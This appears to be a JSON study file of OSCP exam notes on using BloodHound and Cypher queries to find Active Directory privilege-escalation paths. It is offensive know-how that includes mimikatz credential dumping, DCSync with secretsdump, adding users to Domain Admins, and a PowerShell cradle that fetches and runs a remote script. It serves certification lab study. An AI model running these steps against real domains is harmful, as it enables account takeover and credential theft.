{
  "metadata": {
    "file_purpose": "BloodHound Active Directory graph analysis and privilege escalation path discovery for OSCP environments",
    "oscp_relevance": "HIGH - BloodHound reveals privilege escalation paths in AD environments that would take hours/days to discover manually. Critical for OSCP exam AD sets.",
    "educational_context": "BloodHound uses graph theory to analyze AD relationships and permissions. It ingests data from SharpHound collectors (JSON/ZIP files), stores in Neo4j graph database, and provides GUI for querying privilege escalation paths. Advantages: (1) Visualizes complex AD relationships humans miss, (2) Pre-built queries for common attack paths (DCSync, AdminTo, HasSession), (3) Reveals shortest path to Domain Admin, (4) Identifies misconfigurations (unconstrained delegation, Kerberoastable users).",
    "prerequisites": [
      "SharpHound data collection completed (SharpHound.exe or bloodhound-python)",
      "BloodHound GUI installed (apt install bloodhound) and running",
      "Neo4j database running (neo4j console) with default credentials (neo4j:neo4j, then change)",
      "ZIP/JSON files from collector available for upload"
    ],
    "related_techniques": [
      "SharpHound data collection (sharphound-collect-all, bloodhound-python)",
      "Neo4j Cypher queries (manual database queries)",
      "DCSync attacks (secretsdump after path discovered)",
      "Kerberoasting (targeting service accounts found by BloodHound)",
      "Pass-the-Hash lateral movement (after compromising path nodes)"
    ],
    "attack_chain": [
      "1. Run SharpHound collector on compromised host: .\\SharpHound.exe -c All",
      "2. Download ZIP to Kali: download 20240101120000_BloodHound.zip",
      "3. Start Neo4j: sudo neo4j console",
      "4. Start BloodHound GUI: bloodhound",
      "5. Upload data: Click 'Upload Data' → select ZIP",
      "6. Query paths: Search 'pete@corp.com' → mark as owned → Find Shortest Paths to Domain Admins",
      "7. Analyze path nodes and execute attacks (Kerberoasting, AdminTo, HasSession)",
      "8. Document all attack paths for exam report"
    ],
    "manual_alternatives": [
      "PowerView: Get-DomainUser, Get-DomainComputer, Get-DomainGroupMember (manual enumeration)",
      "net.exe commands: net user /domain, net group 'Domain Admins' /domain",
      "LDAP queries: ldapsearch for manual AD enumeration",
      "Manual permission analysis: Get-Acl, Get-ObjectAcl (extremely time-consuming)",
      "Cypher queries directly in Neo4j browser (if BloodHound GUI unavailable)"
    ]
  },
  "commands": [
    {
      "id": "bloodhound-upload-data",
      "name": "BloodHound Upload Collector Data",
      "category": "enumeration",
      "subcategory": "active-directory",
      "command": "bloodhound",
      "description": "Launch BloodHound GUI and upload SharpHound collector data (ZIP/JSON) to Neo4j database for Active Directory graph analysis. Enables visualization of privilege escalation paths, ACL misconfigurations, and attack surface.",
      "variables": [],
      "flag_explanations": {
        "Upload Data button": "GUI button in top-right corner (cloud icon with up arrow). Accepts ZIP files from SharpHound.exe, Invoke-BloodHound.ps1, or bloodhound-python. File formats: Single ZIP archive (preferred) or individual JSON files (computers.json, users.json, groups.json, sessions.json, trusts.json, containers.json, gpos.json, ous.json). WHY ZIP: Compressed format includes all JSONs + metadata. One-click upload vs selecting 8+ individual files.",
        "Data ingestion process": "BloodHound parses JSON → Neo4j Cypher queries create graph nodes/relationships → Index for fast queries. NODES: User, Computer, Group, Domain, GPO, OU, Container. RELATIONSHIPS: AdminTo, MemberOf, HasSession, CanRDP, ExecuteDCOM, AllowedToDelegate, GetChanges, etc. TIME: Small domain (<500 users) = 10-30 seconds. Large domain (5000+ users) = 2-5 minutes.",
        "Database management": "BloodHound stores data in Neo4j database at /usr/share/neo4j/data/databases/graph.db. CRITICAL: Data persists across BloodHound sessions - no need to re-upload unless collecting new data. To clear old data: Click 'Database Info' (gear icon) → 'Clear Database' → Confirm. WHY CLEAR: Old data from different domains causes confusion. EXAM TIP: Clear database before each exam machine to avoid cross-contamination.",
        "File location": "SharpHound output default location (Windows): C:\\Users\\<USER>\\<TIMESTAMP>_BloodHound.zip. bloodhound-python output (Kali): Current directory, named YYYYMMDDHHMMSS_bloodhound.zip. EXAM WORKFLOW: (1) Collect on Windows with SharpHound, (2) Download via Evil-WinRM: download <ZIP>, (3) Upload to BloodHound GUI on Kali."
      },
      "success_indicators": [
        "Output: 'Upload Successful' notification in BloodHound GUI",
        "Database Info shows node counts: Users, Computers, Groups, etc.",
        "Search bar autocompletes domain objects (users, computers)",
        "Pre-built queries return results (click 'Find all Domain Admins')",
        "Graph view displays nodes when searching specific users/computers"
      ],
      "failure_indicators": [
        "Error: 'Connection refused' - Neo4j not running (start: sudo neo4j console)",
        "Error: 'Database unavailable' - Neo4j crashed or authentication failed",
        "Upload hangs indefinitely - corrupted ZIP or JSON syntax error",
        "Zero nodes ingested - empty collector output (SharpHound failed)",
        "Search returns no results - data not ingested or wrong domain"
      ],
      "troubleshooting": {
        "Neo4j not running": "Error: 'Connection refused' on upload. Solution: Start Neo4j database: sudo neo4j console (wait for 'Started' message). Verify: Browse to http://localhost:7474 (should show Neo4j browser). Default credentials: neo4j:neo4j (change on first login to neo4j:bloodhound or custom). BloodHound expects Neo4j bolt://localhost:7687 (default).",
        "Authentication failure": "BloodHound can't connect to Neo4j. Solution: Click 'Database Settings' (gear icon) → Enter bolt://localhost:7687, username neo4j, password bloodhound. If forgotten password: sudo neo4j-admin set-initial-password bloodhound (requires Neo4j stopped: sudo neo4j stop).",
        "Corrupted collector output": "Upload fails or zero nodes ingested. Causes: (1) SharpHound interrupted mid-collection, (2) AV quarantined files, (3) Disk full during collection. Solution: Re-run SharpHound with verbose: .\\SharpHound.exe -c All -v. Check ZIP integrity: unzip -t <file>.zip. Verify JSON syntax: cat computers.json | jq (should parse without errors).",
        "Old data contamination": "Seeing users/computers from previous machines. Solution: Clear database before uploading new data: Database Info → Clear Database → Confirm. EXAM CRITICAL: Always clear between machines to avoid confusing attack paths.",
        "Large domain timeout": "Upload hangs for domains with 10,000+ objects. Solution: Increase Neo4j memory: Edit /etc/neo4j/neo4j.conf, set dbms.memory.heap.initial_size=2G, dbms.memory.heap.max_size=4G. Restart Neo4j: sudo neo4j restart. Alternative: Use bloodhound-python with --zip flag for more efficient collection."
      },
      "notes": "OSCP METHODOLOGY: BloodHound is MANDATORY for AD attack path discovery. Manual enumeration of ACLs, group memberships, and sessions would take hours - BloodHound does it in seconds.\n\nTIME ESTIMATE: 2-5 minutes (Neo4j start + data upload + verification)\n\nWORKFLOW:\n1. Ensure Neo4j running: sudo neo4j console (separate terminal)\n2. Launch BloodHound: bloodhound (or /opt/BloodHound-linux-x64/BloodHound)\n3. Authenticate: bolt://localhost:7687, neo4j:bloodhound\n4. Clear old data: Database Info → Clear Database\n5. Upload: Click Upload Data → Select ZIP from SharpHound\n6. Verify: Database Info shows node counts (Users: 50, Computers: 25, etc.)\n7. Begin analysis: Search owned user → Mark as Owned → Find paths\n\nCOLLECTOR COMPARISON:\n- SharpHound.exe (Windows): Fastest, most complete, runs on target. Requires .NET. Output: C:\\Users\\<USER>\\<TIMESTAMP>_BloodHound.zip\n- Invoke-BloodHound.ps1 (PowerShell): Stealthier (no .exe), slower. May be blocked by execution policy.\n- bloodhound-python (Kali): Remote collection via LDAP/SMB. Doesn't require code execution on target. Less data than SharpHound (no local admin sessions). Syntax: bloodhound-python -u <USER> -p <PASS> -d corp.com -ns <DC_IP> -c All --zip\n\nDATA COLLECTION FLAGS:\n- -c All: Collects everything (default, recommended for OSCP)\n- -c Session: Only logged-on sessions (fast, but misses ACLs)\n- -c ACL: Only ACLs and permissions (misses sessions)\n- -c LoggedOn: Sessions via Windows API (stealthier than Session)\n- --stealth: Removes LDAP queries that may trigger alerts (slower)\n\nPRE-BUILT QUERIES (OSCP CRITICAL):\n1. 'Find Shortest Paths to Domain Admins' - PRIMARY QUERY for exam\n2. 'Find Principals with DCSync Rights' - Identifies DCSync candidates\n3. 'List all Kerberoastable Accounts' - Service accounts with SPNs\n4. 'Shortest Paths to Unconstrained Delegation Systems' - High-value targets\n5. 'Find Computers where Domain Users are Local Admin' - Lateral movement\n6. 'Shortest Paths from Owned Principals' - After compromising first user\n\nEXAM TIP: Mark compromised users as 'Owned' (right-click → Mark User as Owned). This enables 'Shortest Paths from Owned Principals' query to show YOUR available attack paths. Update as you compromise more accounts.\n\nCUSTOM CYPHER QUERIES:\nBloodHound GUI supports raw Cypher queries (bottom text box). Example: Find users with 'admin' in name:\nMATCH (u:User) WHERE u.name =~ '(?i).*admin.*' RETURN u\n\nOPSEC CONSIDERATIONS:\n- SharpHound generates significant LDAP traffic (DetectionLab will log)\n- Use --stealth flag in production (not necessary for OSCP)\n- Executable dropped to disk (SharpHound.exe) may trigger AV\n- Alternative: Reflective PowerShell loading (IEX (New-Object Net.WebClient).DownloadString('http://IP/Invoke-BloodHound.ps1'))\n\nCOMMON MISTAKES:\n❌ Forgetting to mark owned users → Can't use 'Shortest Paths from Owned Principals'\n❌ Not clearing database between machines → Confusing cross-contamination\n❌ Uploading data before Neo4j started → Connection refused errors\n❌ Using outdated collector → BloodHound 4.x requires SharpHound 1.1.0+\n❌ Ignoring 'Outbound Object Control' → Missing privilege escalation paths",
      "oscp_relevance": "high",
      "tags": [
        "OSCP:HIGH",
        "BLOODHOUND",
        "ACTIVE_DIRECTORY",
        "PRIVILEGE_ESCALATION",
        "ENUMERATION",
        "NEO4J",
        "SHARPHOUND",
        "GRAPH_ANALYSIS",
        "ATTACK_PATH"
      ],
      "prerequisites": [
        "sharphound-collect",
        "invoke-bloodhound"
      ],
      "alternatives": [],
      "next_steps": [
        "bloodhound-analyze-paths",
        "bloodhound-cypher-query"
      ]
    },
    {
      "id": "bloodhound-analyze-paths",
      "name": "BloodHound Analyze Privilege Escalation Paths",
      "category": "enumeration",
      "subcategory": "active-directory",
      "command": "bloodhound",
      "description": "Use BloodHound GUI pre-built queries and graph analysis to identify privilege escalation paths from compromised user to Domain Admin. Reveals attack chains via ACL abuse, group memberships, session hijacking, and delegation misconfigurations.",
      "variables": [],
      "flag_explanations": {
        "Search and Mark Owned": "Search bar (top-left) → type compromised username (pete@corp.com) → right-click node → 'Mark User as Owned'. WHY CRITICAL: Owned principals become starting points for 'Shortest Paths from Owned Principals' query. As you compromise more users, mark them owned to reveal NEW attack paths. Owned nodes display with skull icon.",
        "Pre-built Queries": "Left sidebar 'Analysis' tab contains 30+ queries. OSCP CRITICAL QUERIES: (1) 'Shortest Paths to Domain Admins from Owned Principals' - shows YOUR available paths, (2) 'Find all Domain Admins' - identifies targets, (3) 'Find Principals with DCSync Rights' - users who can replicate domain, (4) 'List all Kerberoastable Accounts' - service accounts with SPNs, (5) 'Shortest Paths to Unconstrained Delegation Systems' - high-value targets. Click query → graph displays → analyze nodes and edges.",
        "Graph Edge Types": "Edges (arrows) show relationships/permissions. CRITICAL EDGES: (1) AdminTo - local admin on computer, (2) MemberOf - group membership, (3) HasSession - logged-on session, (4) GenericAll - full control over object, (5) WriteDacl - can modify permissions, (6) ForceChangePassword - can reset password, (7) GetChanges/GetChangesAll - DCSync rights. RIGHT-CLICK edge → 'Help' explains abuse method with commands.",
        "Node Analysis": "Click node → right panel shows properties. USER PROPERTIES: admincount (privileged), pwdlastset (password age), serviceprincipalname (Kerberoastable). COMPUTER PROPERTIES: operatingsystem, unconstraineddelegation (high-value). GROUP PROPERTIES: members, admincount. RIGHT-CLICK node → 'Shortest Paths to Here from Owned Principals' shows how to reach THIS target.",
        "Path Interpretation": "Graph shows numbered nodes (1→2→3→DA). Each edge is a step requiring specific attack. EXAMPLE PATH: pete@corp.com --[MemberOf]--> MANAGEMENT@corp.com --[AdminTo]--> CLIENT75.corp.com --[HasSession]--> maria@corp.com --[MemberOf]--> Domain Admins. TRANSLATION: pete is member of MANAGEMENT group → MANAGEMENT has local admin on CLIENT75 → maria has logged-on session on CLIENT75 → maria is Domain Admin. ATTACK: Use pete → Evil-WinRM to CLIENT75 → mimikatz to dump maria → Pass-the-Hash as maria = Domain Admin."
      },
      "success_indicators": [
        "Graph displays nodes and edges after running query",
        "Path shown from owned user to Domain Admins group",
        "Right-click edge → 'Help' displays abuse instructions",
        "Node properties visible in right panel",
        "Can mark nodes as owned and graph updates with new paths"
      ],
      "failure_indicators": [
        "Query returns 'No paths found' - no direct privilege escalation available",
        "Graph empty after query - data not uploaded or database cleared",
        "Error: 'Connection lost to database' - Neo4j crashed",
        "Owned principals not marked - can't run 'from Owned Principals' queries",
        "Edge help missing - outdated BloodHound version"
      ],
      "troubleshooting": {
        "No paths found": "Query 'Shortest Paths to Domain Admins' returns empty. CAUSES: (1) Compromised user has no privilege escalation path (lateral movement needed), (2) User not marked as owned, (3) Wrong domain (multiple domains in database). SOLUTION: Try broader queries: 'Find Computers where Domain Users can RDP', 'Find Workstations where Domain Users are Local Admin'. Lateral movement to other computers may reveal new sessions. Check if other users found during enumeration have better paths.",
        "Graph too complex": "Query returns hundreds of nodes (unreadable). Solution: Filter by edge type. Right-click edge → 'Filter' → select only critical edges (AdminTo, MemberOf, HasSession). Alternative: Use specific queries instead of 'Shortest Paths to High Value Targets'. Focus on one attack vector: 'List all Kerberoastable Accounts' or 'Find AS-REP Roastable Users'.",
        "Missing sessions data": "No 'HasSession' edges in graph. Causes: (1) SharpHound collected with '-c ACL' only (no sessions), (2) Collection run during off-hours (no users logged on), (3) Bloodhound-python used (doesn't collect local sessions). Solution: Re-run SharpHound with '-c All' during business hours when users are active. Sessions are CRITICAL for privilege escalation - admins logging on to workstations leave credentials in memory.",
        "Outdated attack methods": "Edge 'Help' shows deprecated techniques. Solution: Update BloodHound to latest version: apt update && apt install bloodhound. Alternatively: Right-click edge → note relationship type → Google 'BloodHound [EdgeType] abuse' for updated techniques. Example: WriteDacl → search 'BloodHound WriteDacl abuse PowerView'.",
        "Database corruption": "Queries return inconsistent results or crash. Solution: Export current data: Right-click → 'Export Graph'. Clear database: Database Info → Clear Database. Re-upload ZIP. If persists: Delete Neo4j database: sudo rm -rf /var/lib/neo4j/data/databases/graph.db, restart Neo4j, re-upload."
      },
      "notes": "OSCP METHODOLOGY: BloodHound analysis is DETECTIVE work - you're finding the path that exists, not creating new vulnerabilities. The graph shows REALITY of AD misconfigurations.\n\nTIME ESTIMATE: 5-15 minutes (initial analysis + path documentation)\n\nANALYSIS WORKFLOW:\n1. Upload SharpHound data\n2. Mark initial compromised user as owned\n3. Run: 'Shortest Paths to Domain Admins from Owned Principals'\n4. If no path: Run 'Find Workstations where Domain Users are Local Admin'\n5. Document each path: nodes, edges, attack method\n6. Execute attack chain step by step\n7. Mark newly compromised users as owned\n8. Re-run queries to find additional paths\n\nCRITICAL EDGE TYPES (OSCP EXAM):\n\n**DIRECT EXPLOITATION:**\n- GenericAll: Full control over object. Abuse: Add yourself to group, reset password, modify ACL\n- ForceChangePassword: Reset user password without knowing current. Abuse: net user <target> <newpass> /domain\n- AddMembers: Add users to group. Abuse: net group 'Domain Admins' <user> /add /domain\n\n**LATERAL MOVEMENT:**\n- AdminTo: Local admin rights on computer. Abuse: Evil-WinRM, PSExec, WMI execution\n- CanRDP: RDP access to computer. Abuse: xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>\n- CanPSRemote: PowerShell remoting enabled. Abuse: Enter-PSSession -ComputerName <TARGET>\n\n**CREDENTIAL ACCESS:**\n- HasSession: User logged on to computer (credentials in memory). Abuse: mimikatz sekurlsa::logonpasswords\n- AllowedToDelegate: Unconstrained/constrained delegation. Abuse: Kerberos delegation attacks\n\n**PRIVILEGE ESCALATION:**\n- GetChanges + GetChangesAll: DCSync rights. Abuse: secretsdump.py -just-dc <DOMAIN>/<USER>@<DC>\n- WriteDacl: Modify object permissions. Abuse: Add-ObjectAcl to grant GenericAll to yourself\n- WriteOwner: Change object owner. Abuse: Take ownership, modify permissions\n\n**KERBEROS ATTACKS:**\n- ServicePrincipalName (node property): Kerberoastable user. Abuse: GetUserSPNs.py, crack TGS hash\n- DoesNotRequirePreAuth (node property): AS-REP roastable. Abuse: GetNPUsers.py, crack AS-REP hash\n\nPATH EXECUTION STRATEGY:\n1. Document ENTIRE path before starting\n2. Verify each node is reachable (ping, portscan)\n3. Execute steps in order (can't skip nodes)\n4. If step fails, look for ALTERNATIVE paths\n5. Mark compromised nodes as owned progressively\n6. Save screenshots of BloodHound graph for exam report\n\nCUSTOM QUERIES (OSCP EXAM SCENARIOS):\n\n**Find users with passwords in description:**\n```cypher\nMATCH (u:User) WHERE u.description =~ '(?i).*(pass|pwd).*' RETURN u.name, u.description\n```\n\n**Find computers with unconstrained delegation:**\n```cypher\nMATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name\n```\n\n**Find users with admincount=1 (privileged):**\n```cypher\nMATCH (u:User {admincount:true}) RETURN u.name\n```\n\n**Find paths through specific computer:**\n```cypher\nMATCH p=shortestPath((u:User {owned:true})-[*1..]->(c:Computer {name:'CLIENT75.CORP.COM'})) RETURN p\n```\n\nALTERNATIVE PATHS DOCUMENTATION:\nBloodHound often shows MULTIPLE paths to Domain Admin. Document ALL paths because:\n- Primary path may fail (service down, session logged off)\n- Alternative paths may be faster\n- Exam report should show depth of compromise\n- Demonstrates understanding of AD structure\n\nEXAM TIP: Take screenshots of:\n1. Full graph from owned principal to DA\n2. Each edge's 'Help' popup (shows exact commands)\n3. Node properties for compromised accounts\n4. Database Info (proves data collection scope)\n\nREPORT WRITING:\n\"BloodHound analysis revealed privilege escalation path: pete@corp.com has MemberOf relationship to MANAGEMENT group, which has AdminTo permission on CLIENT75.corp.com. Computer CLIENT75 has active HasSession from maria@corp.com, who is MemberOf Domain Admins. Attack chain: Use pete's credentials via Evil-WinRM to access CLIENT75 as local admin, extract maria's credentials from LSASS memory using mimikatz, authenticate as maria to achieve Domain Admin.\"\n\nCOMMON MISTAKES:\n❌ Not documenting alternative paths → Stuck if primary path fails\n❌ Skipping 'Mark as Owned' → Missing 'from Owned Principals' paths\n❌ Ignoring edge 'Help' → Executing wrong attack method\n❌ Not verifying sessions are active → Wasting time on logged-off users\n❌ Forgetting to clear database → Attacking wrong domain's targets",
      "oscp_relevance": "high",
      "tags": [
        "OSCP:HIGH",
        "BLOODHOUND",
        "ACTIVE_DIRECTORY",
        "PRIVILEGE_ESCALATION",
        "ATTACK_PATH",
        "ENUMERATION",
        "GRAPH_ANALYSIS",
        "DOMAIN_ADMIN",
        "LATERAL_MOVEMENT"
      ],
      "prerequisites": [
        "bloodhound-upload-data"
      ],
      "alternatives": [
        "bloodhound-cypher-query",
        "powerview-find-localadminaccess",
        "powerview-get-netuser"
      ],
      "next_steps": [
        "impacket-getuserspns-kerberoast",
        "ad-dcsync-secretsdump-all",
        "evil-winrm-shell",
        "mimikatz-sekurlsa-logonpasswords"
      ]
    },
    {
      "id": "bloodhound-cypher-query",
      "name": "BloodHound Custom Cypher Query",
      "category": "enumeration",
      "subcategory": "active-directory",
      "command": "MATCH (n:User) RETURN n LIMIT 25",
      "description": "Execute custom Cypher queries in BloodHound GUI to perform advanced graph database analysis beyond pre-built queries. Enables precise enumeration of AD objects, relationships, and attack paths using Neo4j's Cypher query language.",
      "variables": [],
      "flag_explanations": {
        "Cypher query syntax": "Cypher is Neo4j's graph query language (similar to SQL for graphs). BASIC SYNTAX: MATCH (pattern) WHERE (filter) RETURN (output). Example: MATCH (u:User) WHERE u.name =~ '(?i).*admin.*' RETURN u.name, u.description. COMPONENTS: MATCH = find pattern, (u:User) = node labeled User with alias 'u', WHERE = filter condition, RETURN = output fields. WHY USEFUL: Pre-built queries are limited - custom Cypher finds specific configurations.",
        "Node labels": "BloodHound uses 7 node types: User, Computer, Group, Domain, GPO (Group Policy), OU (Organizational Unit), Container. Query specific type: MATCH (c:Computer) RETURN c.name. Query all types: MATCH (n) RETURN labels(n), n.name. PROPERTIES: Each node type has specific properties. User: name, displayname, description, admincount, pwdlastset, serviceprincipalname. Computer: name, operatingsystem, enabled, unconstraineddelegation. Access: node.property (e.g., u.admincount).",
        "Relationship types": "Edges connect nodes and represent permissions/relationships. CRITICAL TYPES: MemberOf, AdminTo, HasSession, GenericAll, WriteDacl, ForceChangePassword, GetChanges, AllowedToDelegate. Query relationships: MATCH (u:User)-[r:MemberOf]->(g:Group) RETURN u.name, g.name. Variable-length paths: MATCH (u:User)-[r*1..3]->(c:Computer) finds paths 1-3 hops long. Wildcard: MATCH (u)-[r]->(n) finds ANY relationship type.",
        "WHERE filters": "Filter nodes/relationships. OPERATORS: = (equals), <> (not equals), =~ (regex), < > <= >= (comparison), AND OR NOT (logic). EXAMPLES: WHERE u.enabled = true (active users only), WHERE u.pwdlastset < 1577836800 (passwords older than 2020), WHERE u.description =~ '(?i).*(password|pass|pwd).*' (descriptions containing password - case insensitive), WHERE u.admincount = true (privileged users).",
        "RETURN and LIMIT": "RETURN specifies output fields. Single field: RETURN u.name. Multiple: RETURN u.name, u.description, u.admincount. All properties: RETURN u. Count: RETURN count(u). LIMIT restricts results: LIMIT 25 (first 25 results). ORDER BY sorts: RETURN u.name ORDER BY u.pwdlastset DESC (oldest passwords first). Aggregation: RETURN g.name, count(u) (count users per group)."
      },
      "success_indicators": [
        "Query executes without syntax errors",
        "Results table displays in bottom panel",
        "Graph visualization shows matching nodes/edges",
        "Result count matches expected (e.g., 'Returned 5 rows in 0.023s')",
        "Can export results as JSON or CSV"
      ],
      "failure_indicators": [
        "Error: 'Invalid input' - Cypher syntax error",
        "Error: 'Variable not defined' - typo in node/relationship alias",
        "Error: 'Property does not exist' - querying non-existent property",
        "Query hangs indefinitely - too complex or database locked",
        "Returns zero results when data should exist - wrong filter or label"
      ],
      "troubleshooting": {
        "Syntax errors": "Error: 'Invalid input' or 'Unexpected token'. Common causes: (1) Missing parentheses around node patterns, (2) Missing colon before label MATCH (u User) → MATCH (u:User), (3) Wrong relationship syntax -[:Type]- → -[:Type]-> (directed), (4) Unterminated string WHERE u.name = 'admin (missing closing quote). Solution: Check BloodHound Cypher documentation, test simple queries first (MATCH (n) RETURN n LIMIT 1), use Neo4j browser for better error messages (http://localhost:7474).",
        "No results when expected": "Query runs but returns empty. Causes: (1) Wrong node label (User vs user - case sensitive), (2) Wrong property name (u.username vs u.name), (3) Filter too restrictive (pwdlastset = 0 may not exist), (4) Data not uploaded. Solution: Test broad query first: MATCH (u:User) RETURN count(u) (should return total users). Verify property names: MATCH (u:User) RETURN keys(u) LIMIT 1 (lists all properties). Check data uploaded: Database Info shows node counts.",
        "Query timeout": "Query hangs for >30 seconds. Causes: (1) Variable-length path too long [*1..10], (2) No LIMIT on large result set, (3) Complex WHERE with regex on all nodes. Solution: Add LIMIT: LIMIT 100, reduce path length: [*1..3], use indexed properties in WHERE (u.name is indexed, u.description is not). For complex queries: Run in Neo4j browser first to test performance.",
        "Property not found": "Error: 'Property does not exist'. Causes: (1) Typo in property name (u.admincount vs u.adminCount - case sensitive), (2) Property doesn't exist for that node type (Computer.serviceprincipalname doesn't exist - only Users have this), (3) Data collected without property (SharpHound -c Session won't have ACL properties). Solution: List available properties: MATCH (u:User) RETURN keys(u) LIMIT 1. Use OPTIONAL: WHERE u.description IS NOT NULL.",
        "Case sensitivity": "Cypher is case-sensitive for labels and properties but NOT for keywords. CORRECT: MATCH (u:User) RETURN u.name. INCORRECT: match (u:user) return u.Name. Node labels: User, Computer, Group, Domain, GPO, OU (capitalized). Keywords: MATCH, WHERE, RETURN can be any case (match, Match, MATCH all work). Property names: exact case required (u.name not u.Name)."
      },
      "notes": "OSCP METHODOLOGY: Custom Cypher queries enable TARGETED enumeration beyond BloodHound's pre-built queries. Use when looking for specific configurations or testing hypotheses.\n\nTIME ESTIMATE: 2-5 minutes per query (writing + execution + analysis)\n\nQUERY WORKFLOW:\n1. Start simple: MATCH (u:User) RETURN u.name LIMIT 10\n2. Add filters: WHERE u.admincount = true\n3. Add relationships: MATCH (u:User)-[:MemberOf]->(g:Group)\n4. Analyze results in table/graph view\n5. Export for documentation: Right-click results → Export\n\nOSCP EXAM QUERIES:\n\n**1. Find users with passwords in description field:**\n```cypher\nMATCH (u:User)\nWHERE u.description =~ '(?i).*(pass|pwd|password).*'\nRETURN u.name, u.description\n```\nWHY: Admins sometimes document passwords in AD descriptions. Quick win.\n\n**2. Find all Kerberoastable users (has SPN):**\n```cypher\nMATCH (u:User)\nWHERE u.hasspn = true AND u.admincount = false\nRETURN u.name, u.serviceprincipalname\n```\nWHY: Service accounts often have weak passwords. Crack TGS offline.\n\n**3. Find computers with unconstrained delegation:**\n```cypher\nMATCH (c:Computer)\nWHERE c.unconstraineddelegation = true\nRETURN c.name, c.operatingsystem\n```\nWHY: High-value targets for credential theft via delegation abuse.\n\n**4. Find users with DCSync rights:**\n```cypher\nMATCH (u:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain)\nRETURN u.name, d.name\n```\nWHY: Users with Replicating Directory Changes can perform DCSync attack.\n\n**5. Find shortest path between two specific users:**\n```cypher\nMATCH p=shortestPath((u1:User {name:'PETE@CORP.COM'})-[*1..]->(**u2:User {name:'MARIA@CORP.COM'}))\nRETURN p\n```\nWHY: Targeted path finding when you know source and destination.\n\n**6. Find all users who can RDP to specific computer:**\n```cypher\nMATCH (u)-[:CanRDP|MemberOf|AdminTo*1..]->(c:Computer {name:'CLIENT75.CORP.COM'})\nRETURN DISTINCT u.name\n```\nWHY: Identify all users who can access specific target.\n\n**7. Find users with passwords older than 1 year:**\n```cypher\nMATCH (u:User)\nWHERE u.pwdlastset < (datetime().epochSeconds - 31536000)\nRETURN u.name, u.pwdlastset\nORDER BY u.pwdlastset ASC\n```\nWHY: Old passwords more likely to be weak or cracked in breaches.\n\n**8. Find all Domain Admins and their properties:**\n```cypher\nMATCH (u:User)-[:MemberOf*1..]->(g:Group)\nWHERE g.name =~ '(?i)domain admins.*'\nRETURN u.name, u.enabled, u.pwdlastset, u.admincount\n```\nWHY: Enumerate all DA accounts and their security posture.\n\n**9. Find computers where Domain Users are local admin:**\n```cypher\nMATCH (g:Group {name:'DOMAIN USERS@CORP.COM'})-[:AdminTo]->(c:Computer)\nRETURN c.name, c.operatingsystem\n```\nWHY: Massive misconfiguration - any domain user can compromise these systems.\n\n**10. Find users who have never logged in:**\n```cypher\nMATCH (u:User)\nWHERE u.lastlogon = 0\nRETURN u.name, u.description\n```\nWHY: Unused accounts may have default or documented passwords.\n\n**11. Count relationships by type:**\n```cypher\nMATCH ()-[r]-()\nRETURN type(r) as relationship, count(r) as count\nORDER BY count DESC\n```\nWHY: Understand AD structure and identify common relationship types.\n\n**12. Find all paths from owned user to high-value targets:**\n```cypher\nMATCH p=(u:User {owned:true})-[*1..5]->(c:Computer {highvalue:true})\nRETURN p LIMIT 10\n```\nWHY: Targeted privilege escalation from compromised account.\n\nCYPHER CHEAT SHEET:\n\n**Node Patterns:**\n- (n) - any node\n- (u:User) - User node\n- (u:User {name:'PETE@CORP.COM'}) - specific user\n- (u:User|Computer) - User OR Computer node\n\n**Relationship Patterns:**\n- -[r]-> - any directed relationship\n- -[r:MemberOf]-> - specific type\n- -[r:MemberOf|AdminTo]-> - multiple types\n- -[*1..3]-> - variable length 1-3 hops\n- -[*]-> - any length (dangerous, can timeout)\n\n**Filters (WHERE):**\n- = <> - equality\n- < > <= >= - comparison\n- =~ - regex (case-insensitive: (?i))\n- IS NULL / IS NOT NULL - existence\n- AND OR NOT - logic\n- IN [list] - membership\n\n**Aggregation:**\n- count(n) - count nodes\n- collect(n.name) - list of names\n- avg(n.property) - average\n- max(n.property) - maximum\n\n**Sorting/Limiting:**\n- ORDER BY n.name ASC/DESC\n- LIMIT 25\n- SKIP 10 LIMIT 25 (pagination)\n\nADVANCED TECHNIQUES:\n\n**Find attack paths with specific edge:**\n```cypher\nMATCH p=(u:User {owned:true})-[r*1..5]->(g:Group)\nWHERE ALL(rel in r WHERE type(rel) IN ['MemberOf', 'AdminTo', 'HasSession'])\nRETURN p\n```\n\n**Find users with most privileges:**\n```cypher\nMATCH (u:User)-[r]->()\nRETURN u.name, count(r) as privileges\nORDER BY privileges DESC LIMIT 10\n```\n\n**Find circular group memberships:**\n```cypher\nMATCH p=(g:Group)-[:MemberOf*1..]->(g)\nRETURN p\n```\n\nNEO4J BROWSER (ALTERNATIVE):\nBloodHound GUI limited for complex queries. Use Neo4j browser for:\n- Better error messages\n- Query result export (CSV, JSON)\n- Query plan analysis (EXPLAIN, PROFILE)\n- Access: http://localhost:7474 (authenticate: neo4j:bloodhound)\n\nEXAM TIP: Pre-write common queries in cheat sheet. Copy-paste into BloodHound during exam. Document interesting findings with screenshots.\n\nCOMMON MISTAKES:\n❌ Missing LIMIT on broad queries → GUI crashes with 10,000+ results\n❌ Case errors in labels/properties → Empty results\n❌ Using [*] without LIMIT → Query never completes\n❌ Not testing queries incrementally → Can't debug complex failures\n❌ Forgetting regex case-insensitive flag (?i) → Missing matches",
      "oscp_relevance": "high",
      "tags": [
        "OSCP:HIGH",
        "BLOODHOUND",
        "CYPHER",
        "NEO4J",
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "GRAPH_DATABASE",
        "CUSTOM_QUERY",
        "ADVANCED_ENUMERATION"
      ],
      "prerequisites": [
        "bloodhound-upload-data"
      ],
      "alternatives": [
        "bloodhound-analyze-paths"
      ],
      "next_steps": [
        "impacket-getuserspns-kerberoast",
        "ad-dcsync-secretsdump-all",
        "evil-winrm-shell",
        "mimikatz-sekurlsa-logonpasswords"
      ]
    }
  ]
}
